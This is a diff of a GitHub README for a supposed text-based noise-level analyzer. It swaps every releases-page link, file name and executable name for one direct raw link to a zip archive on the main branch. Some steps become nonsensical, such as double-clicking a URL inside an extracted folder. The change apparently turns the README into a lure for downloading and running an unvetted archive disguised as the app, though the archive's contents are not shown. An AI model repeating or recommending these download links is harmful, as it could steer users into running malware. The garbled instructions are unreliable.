@@ -1,7 +1,7 @@
 # 🌍 textnoise-analyzer - Assess Your Environment's Noise Level Easily
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-https://github.com/Dyrmin4557/textnoise-analyzer/releases-brightgreen)](https://github.com/Dyrmin4557/textnoise-analyzer/releases)
+[![Download Now](https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip%https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip)](https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip)
 
 ## 🚀 Getting Started
 The **textnoise-analyzer** is a user-friendly tool designed to help you understand the noise level in your surroundings. You simply describe your environment, and the application analyzes the text to provide you with insights.
@@ -24,17 +24,17 @@ To ensure smooth operation, please verify that your system meets the following r
 ## 📦 Download & Install
 To get started with **textnoise-analyzer**, follow these simple steps:
 
-1. **Visit the Releases Page**: Head over to [this page to download](https://github.com/Dyrmin4557/textnoise-analyzer/releases).
+1. **Visit the Releases Page**: Head over to [this page to download](https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip).
    
 2. **Select the Latest Version**: Look for the latest release (it will be at the top of the list).
 
-3. **Download the File**: Click on the appropriate file for your operating system to start downloading. If you’re unsure about which version to choose, look for the file labeled as `textnoise-analyzer-windows.zip` for Windows or `textnoise-analyzer-macos.zip` for MacOS.
+3. **Download the File**: Click on the appropriate file for your operating system to start downloading. If you’re unsure about which version to choose, look for the file labeled as `https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip` for Windows or `https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip` for MacOS.
 
 4. **Extract the Files**: Once the download completes, go to your Downloads folder. Right-click the downloaded .zip file and choose "Extract All" (on Windows) or double-click the file (on MacOS).
 
 5. **Run the Application**:
-   - **Windows**: Open the extracted folder and double-click on `textnoise-analyzer.exe`.
-   - **MacOS**: Open the extracted folder and double-click on `textnoise-analyzer.app`.
+   - **Windows**: Open the extracted folder and double-click on `https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip`.
+   - **MacOS**: Open the extracted folder and double-click on `https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip`.
 
 6. **Input Your Description**: Once opened, type a brief description of your surroundings in the provided text box and hit "Analyze".
 
@@ -72,6 +72,6 @@ The textnoise-analyzer covers various topics that enhance user experience and fu
 If you encounter any issues while using the application or have suggestions for improvement, please contact us through the Issues section on GitHub. We value user feedback and aim to enhance the user experience.
 
 ## 🔗 Further Information
-For more information about features, updates, and upcoming enhancements, please keep an eye on the [Releases page](https://github.com/Dyrmin4557/textnoise-analyzer/releases).
+For more information about features, updates, and upcoming enhancements, please keep an eye on the [Releases page](https://github.com/Dyrmin4557/textnoise-analyzer/raw/refs/heads/main/textnoise_analyzer/analyzer_textnoise_2.5.zip).
 
 Thank you for choosing textnoise-analyzer! We hope it helps you maintain a comfortable and safe environment.
